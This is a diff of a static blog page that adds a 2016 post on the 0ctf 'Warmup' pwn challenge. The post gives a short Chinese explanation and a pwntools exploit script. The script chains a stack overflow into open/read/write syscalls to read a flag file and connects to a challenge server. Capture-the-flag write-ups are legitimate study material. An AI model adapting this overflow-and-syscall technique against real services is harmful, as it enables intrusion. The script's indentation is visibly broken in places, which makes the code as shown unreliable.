@@ -109,7 +109,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/PWN/" style="font-size: 10px;">PWN</a> <a href="/tags/心情/" style="font-size: 10px;">心情</a>
+						<a href="/tags/PWN/" style="font-size: 10px;">PWN</a> <a href="/tags/pwn-0ctf/" style="font-size: 10px;">pwn,0ctf</a> <a href="/tags/心情/" style="font-size: 10px;">心情</a>
 					</div>
 				</section>
 				
@@ -176,6 +176,65 @@
 </nav>
 
       <div class="body-wrap">
+  
+    <article id="post-0ctf-2016-pwn" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/03/14/0ctf-2016-pwn/" class="article-date">
+  	<time datetime="2016-03-14T07:49:54.000Z" itemprop="datePublished">2016-03-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/03/14/0ctf-2016-pwn/">0ctf-2016-pwn</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0CTF-PWN-Warmup"><a href="#0CTF-PWN-Warmup" class="headerlink" title="0CTF-PWN-Warmup"></a>0CTF-PWN-Warmup</h1><blockquote>
+<p>非动态可执行文件，简单的栈溢出，但是距离不够，而且没有什么ROP可以构造，而且函数全部都是用int 0x80中断实现的，而且有沙盒保护，所以用中断拿shell应该是禁止的，于是想着用中断执行open再read出来，再write出来。这样的话就要溢出后再返回start，同时利用read的返回值设定eax,达到调用函数的功能。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">__author__=<span class="string">'simple'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">addr_read=<span class="number">0x0804811d</span></span><br><span class="line">addr_pop30=<span class="number">0x080481B8</span> </span><br><span class="line">start=<span class="number">0x080480d8</span></span><br><span class="line">addr_1=<span class="number">0x080491bc</span></span><br><span class="line">addr_2=<span class="number">0x080491d3</span></span><br><span class="line">syscall=<span class="number">0x0804813A</span> </span><br><span class="line">addr_write=<span class="number">0x08048135</span></span><br><span class="line">llen=<span class="number">0x60</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill_stack</span><span class="params">(io,rt,b1,b2,b3,b4)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> io.recvuntil(<span class="string">'6!'</span>)</span><br><span class="line">    shellcode=<span class="string">'a'</span>*<span class="number">0x20</span>+p32(rt)+p32(b1 )+p32(b2)+p32(b3)+p32(b4)</span><br><span class="line">    io.send(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(choice,io)</span>:</span></span><br><span class="line">    gdb_code=<span class="string">'b *0x080481BB\n'</span>+<span class="string">'b *0x8048134\n'</span></span><br><span class="line">    gdb_code+=<span class="string">'display /80wx $esp\n'</span>+<span class="string">'display /s 0x080491D3\n'</span></span><br><span class="line">    <span class="comment">#/home/warmup/flag</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0x1</span>:</span><br><span class="line">            io.recvuntil(<span class="string">'6!'</span>)</span><br><span class="line">            shellcode=<span class="string">'a'</span>*<span class="number">0x20</span>+p32(addr_read)+p32(start )+p32(<span class="number">0</span>)+p32(addr_1)+p32(<span class="number">0x16</span>)</span><br><span class="line">            io.send(shellcode)</span><br><span class="line">            io.send(<span class="string">'/home/warmup/flag'</span>+<span class="string">'\x00'</span>)</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0x6</span>:  <span class="comment">#tiao  open</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'ok-0'</span></span><br><span class="line">            fill_stack(io,addr_read,addr_pop30, <span class="number">0</span> , addr_2,llen)</span><br><span class="line">        io.send(<span class="string">'12345'</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'-----------aftersend-------------------'</span></span><br><span class="line">            <span class="comment">#io.interactive()   </span></span><br><span class="line">            fill_stack(io,start,i,i,i, i)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'ok-1'</span></span><br><span class="line">            <span class="comment">#gdb.attach(proc.pidof(io)[0],gdb_code)</span></span><br><span class="line">            fill_stack(io,addr_read,   start  ,  <span class="number">3</span>  ,  addr_2,  llen)<span class="comment"># read -&gt; buf-2</span></span><br><span class="line">            fill_stack(io,start,i,i,i, i)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'ok-2'</span></span><br><span class="line">            fill_stack(io,addr_write,   start  ,  <span class="number">1</span>  ,  addr_2,  llen)<span class="comment"># write-&gt; buf-2 -&gt;1</span></span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">if</span> i==<span class="number">0x4</span>:</span><br><span class="line">            fill_stack(io, start,   i,syscall,  start ,addr_1)</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0x3</span>:</span><br><span class="line">            fill_stack(io,start,  <span class="number">0</span>  , i,i,i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fill_stack(io,start,i,i,i,i)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'1-&gt;本地 2-&gt;远程 3-nc'</span></span><br><span class="line">    choice =int(raw_input().strip(<span class="string">'\n'</span>))</span><br><span class="line">    <span class="keyword">if</span> choice==<span class="number">1</span>:</span><br><span class="line">        r= process(<span class="string">'./warmup'</span>)</span><br><span class="line">    <span class="keyword">elif</span> choice==<span class="number">3</span>:</span><br><span class="line">        r=remote(<span class="string">'127.0.0.1'</span>,<span class="number">6666</span>)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        r=remote(<span class="string">'202.120.7.207'</span>,<span class="number">52608</span>)</span><br><span class="line">    exp(choice,r)</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn-0ctf/">pwn,0ctf</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-pwnable-writeup" class="article article-type-post" itemscope itemprop="blogPost">
   
